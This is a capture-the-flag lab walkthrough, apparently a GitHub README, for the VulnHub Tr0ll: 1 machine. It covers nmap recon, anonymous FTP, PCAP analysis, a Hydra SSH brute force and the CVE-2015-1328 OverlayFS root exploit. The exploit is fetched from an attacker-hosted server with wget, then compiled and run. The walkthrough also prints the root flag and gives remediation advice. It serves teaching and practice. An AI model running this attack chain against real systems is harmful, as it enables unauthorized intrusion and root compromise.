# Tr0ll: 1 — VulnHub Penetration Test

<p align="center">
  <img src="https://img.shields.io/badge/Platform-VulnHub-blue?style=for-the-badge&logo=linux&logoColor=white"/>
  <img src="https://img.shields.io/badge/Difficulty-Beginner%2FIntermediate-orange?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Result-Root%20Compromised-critical?style=for-the-badge&logo=linux&logoColor=white"/>
  <img src="https://img.shields.io/badge/CVE-2015--1328-red?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Author-Primenexuss-blueviolet?style=for-the-badge&logo=github"/>
</p>

---

## Overview

| Field | Details |
|---|---|
| **Machine** | Tr0ll: 1 |
| **Platform** | VulnHub |
| **Target IP** | `192.168.56.138` |
| **Attacker IP** | `192.168.56.101` (Kali Linux) |
| **Target OS** | Ubuntu 14.04.1 LTS — Trusty (Kernel 3.13.0-32-generic i686) |
| **Services** | FTP (21), SSH (22), HTTP (80) |
| **Key Exploit** | CVE-2015-1328 — OverlayFS Local Privilege Escalation |
| **Root Flag** | `702a8c18d29c6f3ca0d99ef5712bfbdc` |
| **Author** | Primenexuss / [Nex-Experience](https://github.com/PrimeNexuss) |

---

## Attack Chain Summary

```
[Nmap Scan] → [Anonymous FTP → lol.pcap] → [Wireshark PCAP Analysis]
     → [Hidden Web Directory /sup3rs3cr3tdirlol]
     → [roflmao ELF Binary → strings → 0x0856BF URL hint]
     → [Credential Wordlists via HTTP]
     → [Hydra SSH Brute-Force → overflow:Good_job_:)]
     → [SSH Initial Access]
     → [CVE-2015-1328 OverlayFS Kernel Exploit]
     → [ROOT]
```

---

## MITRE ATT&CK Coverage

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Network Service Discovery | T1046 |
| Collection | Network Sniffing (PCAP Analysis) | T1040 |
| Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credentials in Files | T1552.001 |
| Credential Access | Brute Force: Password Guessing | T1110.001 |
| Initial Access | Valid Accounts | T1078 |
| Lateral Movement | Remote Services: SSH | T1021.004 |
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Step-by-Step Walkthrough

### 1. Reconnaissance — Nmap Port Scan

```bash
sudo nmap -Pn -sV -sC -T5 -p- 192.168.56.138
```

Three open ports discovered: FTP (21 — vsFTPd 3.0.2), SSH (22 — OpenSSH 6.6.1p1), HTTP (80 — Apache 2.4.7).
`robots.txt` disclosed a `/secret` path. FTP banner confirmed anonymous login permitted.

---

### 2. Anonymous FTP — PCAP Retrieval

```bash
ftp 192.168.56.138
# Name: anonymous  Password: (blank)
ftp> ls -la
ftp> get lol.pcap
```

Anonymous FTP login succeeded. A single file `lol.pcap` (8,068 bytes) was present in the FTP root. Downloaded for offline analysis.


---

### 3. PCAP Analysis — Hidden Directory Leaked

```bash
wireshark lol.pcap
```


Opened `lol.pcap` in Wireshark. Analysis of the FTP-DATA stream (packet 40) revealed the contents of `secret_stuff.txt` being transferred in plaintext. The file leaked the hidden web directory: **`/sup3rs3cr3tdirlol`**.

---

### 4. Web Enumeration — Hidden Directory & Binary

Navigated to `http://192.168.56.138/sup3rs3cr3tdirlol/` — Apache directory listing was enabled, exposing a single ELF binary named `roflmao`.


Downloaded `roflmao` and examined it locally:

```bash
file roflmao
strings roflmao
```


The `strings` output contained: **`Find address 0x0856BF to proceed`** — pointing to a further web path.

---

### 5. Credential Discovery

Browsing to `http://192.168.56.138/0x0856BF/` exposed two subdirectories:


```bash
wget http://192.168.56.138/0x0856BF/good_luck/which_one_lol.txt
wget http://192.168.56.138/0x0856BF/this_folder_contains_the_password/Pass.txt
```

| File | Contents |
|---|---|
| `which_one_lol.txt` | 10 candidate usernames: maleus, ps-aux, felux, Eagle11, usmc8892, blawrg, wytshadow, vis1t0r, **overflow**, genphlux |
| `Pass.txt` | Single password: `Good_job_:)` |

---

### 6. SSH Brute-Force — Hydra

```bash
hydra -L which_one_lol.txt -P Pass.txt ssh://192.168.56.138
```


**Valid credentials found:** `overflow` / `Good_job_:)`

---

### 7. Initial Access — SSH Login

```bash
ssh overflow@192.168.56.138
# Password: Good_job_:)
```


System confirmed as **Ubuntu 14.04.1 LTS**, kernel **3.13.0-32-generic (i686)** — vulnerable to CVE-2015-1328.

---

### 8. Privilege Escalation — CVE-2015-1328 (OverlayFS)

**Vulnerability:** The kernel incorrectly handles permissions in the OverlayFS driver, allowing an unprivileged user to manipulate `/etc/ld.so.preload` and inject a malicious shared library that is loaded by the setuid-root `/bin/su` binary.

| Field | Value |
|---|---|
| **CVE** | CVE-2015-1328 |
| **CVSS v3** | 7.8 (High) |
| **Affected** | Ubuntu 12.04 / 14.04 / 14.10 / 15.04, kernels before 2015-06-15 |
| **Exploit** | Exploit-DB #37292 |
| **MITRE** | T1068 — Exploitation for Privilege Escalation |

On the **attacker machine**, serve the exploit:

```bash
python3 -m http.server 8990
```

On the **target**, download, compile and execute:

```bash
cd /tmp
wget http://192.168.56.1:8990/37292.c
gcc -o exploit 37292.c
./exploit
```

Exploit output:
```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
#
```

**Root shell obtained.**

---

### 9. Root Flag

```bash
# cd /root
# ls
# cat proof.txt
```

```
Good job, you did it!

702a8c18d29c6f3ca0d99ef5712bfbdc
```

> **Note:** The machine runs a cron job that broadcasts "TIMES UP LOL!" and closes SSH sessions roughly every 5 minutes, resetting any modified files. The privilege escalation must be completed within the active window.

---

## Vulnerabilities Summary

| # | Vulnerability | CVSS | CWE |
|---|---|---|---|
| 1 | Anonymous FTP Access | 7.5 High | CWE-284 |
| 2 | HTTP Directory Listing Enabled | 7.5 High | CWE-548 |
| 3 | Plaintext Credentials in Web-Accessible Files | 7.5 High | CWE-312 |
| 4 | Weak SSH Password Policy | 7.3 High | CWE-521 |
| 5 | CVE-2015-1328 — OverlayFS Privilege Escalation | 7.8 High | CWE-269 |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning and service enumeration |
| `ftp` | Anonymous FTP connection and file retrieval |
| `wireshark` | PCAP analysis and FTP stream inspection |
| `wget` | File download from HTTP server |
| `file` / `strings` | ELF binary analysis |
| `hydra` | SSH brute-force credential testing |
| `ssh` | Remote shell access |
| `gcc` | On-target exploit compilation |
| `python3 -m http.server` | Serving exploit to target |

---

## Remediation

| Finding | Recommendation |
|---|---|
| Anonymous FTP | Disable in `vsftpd.conf`; use SFTP instead |
| Directory Listing | Set `Options -Indexes` in Apache config |
| Credential Files on Web | Never store credentials in web root |
| Weak SSH Passwords | Enforce key-based auth; deploy fail2ban |
| Unpatched Kernel | Apply all security updates; upgrade from EOL Ubuntu 14.04 |

---

## Full Report

A complete professional penetration test report (with all evidence screenshots, CVSS scores, and MITRE ATT&CK mappings) is available in the repository.

---

<p align="center">
  <b>Primenexuss</b> | <a href="https://github.com/PrimeNexuss">Nex-Experience</a><br/>
  <i>This walkthrough is for educational purposes in a controlled lab environment.</i>
</p>
